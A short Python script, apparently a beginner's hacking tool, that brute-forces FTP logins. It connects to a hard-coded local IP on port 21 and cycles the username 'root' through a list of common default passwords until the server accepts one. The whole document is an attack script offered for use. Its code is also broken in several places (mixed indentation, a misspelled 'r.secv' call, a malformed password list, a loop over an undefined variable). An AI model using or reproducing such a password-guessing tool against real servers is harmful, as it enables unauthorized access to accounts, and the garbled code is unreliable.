#! /usr/bin/python
#Aurthor chownwolf
import socket
import re
import sys

def connect(username, password):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print("[*] Trying "+ username + ":" + password)
		#What ever ip address you found
    s.connect(('192.168.1.2', 21))
		data = s.recv(1024)
		s.send('USER ' + username + ' \r\n')
		data = s.recv(1024)
		s.send('PASS ' + password + ' \r\n')
		data = r.secv (3)
		s.send('QUIT\r\n')
		s.close()
		return data
#What ever username
username = "root"
#Try some basic passwords
password = "["", "abc123", "backup", "password", "Password", "password123", "Password123", "12345", "root", "administrator", "ftp", "admin", "P@ssword123", "P@ssword", "P@ssword123!!!"]

for password in passwords: 
		attempt = connect(username, password)
		if attempt=='230':
			print("[*] Password found: "+ password)
			sys.exit(0)
